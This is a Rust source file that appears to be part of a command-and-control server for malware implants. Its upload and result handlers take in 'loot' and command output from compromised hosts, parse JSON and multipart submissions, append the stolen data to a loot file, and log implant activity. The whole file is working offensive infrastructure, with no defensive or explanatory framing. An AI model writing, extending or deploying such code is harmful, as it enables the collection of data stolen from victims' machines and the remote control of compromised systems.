/// Upload handler — receives loot and command results from implants.
use axum::{
    body::Bytes,
    extract::State,
    http::StatusCode,
    Json,
};
use std::sync::Arc;

use crate::models::*;
use crate::state::AppState;
use crate::util;

/// POST /upload — saves multipart or raw body as loot, or processes result JSON.
pub async fn upload(
    State(state): State<Arc<AppState>>,
    body: Bytes,
) -> (StatusCode, Json<serde_json::Value>) {
    let size = body.len();
    if size == 0 {
        return (StatusCode::OK, Json(serde_json::json!({"status": "ok"})));
    }

    // Try to parse as a JSON result submission first
    if body.first() == Some(&b'{') {
        if let Ok(payload) = serde_json::from_slice::<serde_json::Value>(&body) {
            // Check if this is a result submission
            if payload.get("command_id").is_some() && payload.get("status").is_some() {
                let implant_id = payload.get("implant_id")
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");

                let result_data = CommandResultData {
                    command_id: payload.get("command_id").and_then(|v| v.as_str()).map(String::from),
                    status: payload.get("status").and_then(|v| v.as_str()).map(String::from),
                    data: payload.get("data").cloned(),
                };

                state.store_result(implant_id, result_data).await;
                state.broadcast_event(C2Event::LootReceived {
                    implant_id: implant_id.to_string(),
                    size,
                });

                util::log_line(&state.all_log, &format!("RESULT  implant={}  size={}", implant_id, size));
                return (StatusCode::OK, Json(serde_json::json!({"status": "ok", "stored": "result"})));
            }

            // Check for results array in beacon-like payload
            if let Some(results) = payload.get("results").and_then(|v| v.as_array()) {
                let implant_id = payload.get("host")
                    .or(payload.get("implant_id"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");

                for result in results {
                    let rd = CommandResultData {
                        command_id: result.get("id").and_then(|v| v.as_str()).map(String::from),
                        status: result.get("status").and_then(|v| v.as_str()).map(String::from),
                        data: Some(result.clone()),
                    };
                    state.store_result(implant_id, rd).await;
                }
                return (StatusCode::OK, Json(serde_json::json!({"status": "ok", "stored": "results"})));
            }

            // Legacy beacon sent to /upload by mistake
            let preview = &body[..size.min(200)];
            util::log_line(&state.all_log, &format!("BEACON_VIA_UPLOAD  size={}  data={}", size, String::from_utf8_lossy(preview)));
            util::log_line(&state.beacon_log, &format!("BEACON_VIA_UPLOAD  size={}  data={}", size, String::from_utf8_lossy(preview)));
            return (StatusCode::OK, Json(serde_json::json!({"status": "ok", "logged": "beacon_via_upload"})));
        }
    }

    // Try multipart parsing
    let text = String::from_utf8_lossy(&body);
    if text.contains("Content-Disposition: form-data") {
        parse_multipart_bytes(&state, &body).await;
        return (StatusCode::OK, Json(serde_json::json!({"status": "ok", "type": "multipart"})));
    }

    // Raw binary loot
    util::log_line(&state.all_log, &format!("LOOT  size={}", size));
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(&state.loot_file) {
        let _ = std::io::Write::write_all(&mut f, &body);
    }

    (StatusCode::OK, Json(serde_json::json!({"status": "ok", "type": "binary", "size": size})))
}

/// POST /result — dedicated endpoint for command result submission.
pub async fn submit_result(
    State(state): State<Arc<AppState>>,
    body: Bytes,
) -> (StatusCode, Json<serde_json::Value>) {
    if let Ok(payload) = serde_json::from_slice::<serde_json::Value>(&body) {
        let implant_id = payload.get("implant_id")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        let result_data = CommandResultData {
            command_id: payload.get("command_id").and_then(|v| v.as_str()).map(String::from),
            status: payload.get("status").and_then(|v| v.as_str()).map(String::from),
            data: payload.get("data").cloned(),
        };

        state.store_result(implant_id, result_data).await;
        util::log_line(&state.all_log, &format!("RESULT  implant={}  size={}", implant_id, body.len()));
    }

    (StatusCode::OK, Json(serde_json::json!({"status": "ok"})))
}

// ── Multipart parser (preserved from original) ────────────────────────

async fn parse_multipart_bytes(state: &Arc<AppState>, body: &[u8]) {
    let first_line_end = body.iter().position(|&b| b == b'\n').unwrap_or(body.len());
    let first_line = &body[..first_line_end];
    let boundary = first_line.trim_ascii_end();

    let mut pos = first_line_end + 1;
    let boundary_delim = [&b"\r\n"[..], boundary].concat();
    let boundary_end = [&boundary_delim[..], b"--"].concat();

    while pos < body.len() {
        let rest = &body[pos..];
        let delim_pos = rest.windows(boundary_delim.len()).position(|w| w == boundary_delim);
        let end_pos = rest.windows(boundary_end.len()).position(|w| w == boundary_end);

        if let Some(dpos) = delim_pos {
            let part = &rest[..dpos];
            let part = if part.starts_with(b"\r\n") { &part[2..] } else { part };
            if !part.is_empty() && !part.starts_with(b"--") {
                process_part(state, part).await;
            }
            pos += dpos + boundary_delim.len();
        } else if let Some(epos) = end_pos {
            let part = &rest[..epos];
            let part = if part.starts_with(b"\r\n") { &part[2..] } else { part };
            if !part.is_empty() && !part.starts_with(b"--") {
                process_part(state, part).await;
            }
            break;
        } else {
            break;
        }
    }
}

async fn process_part(state: &Arc<AppState>, part: &[u8]) {
    let sep = part.windows(4).position(|w| w == b"\r\n\r\n");
    let (_headers, data) = if let Some(spos) = sep {
        (&part[..spos], &part[spos + 4..])
    } else {
        (b"" as &[u8], part)
    };

    let data = if data.ends_with(b"\r\n") { &data[..data.len() - 2] } else { data };
    let size = data.len();
    let kind = if data.first() == Some(&b'{') { "json" } else { "binary" };

    util::log_line(&state.all_log, &format!("LOOT  size={}  type={}", size, kind));

    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(&state.loot_file) {
        let _ = std::io::Write::write_all(&mut f, data);
    }
}
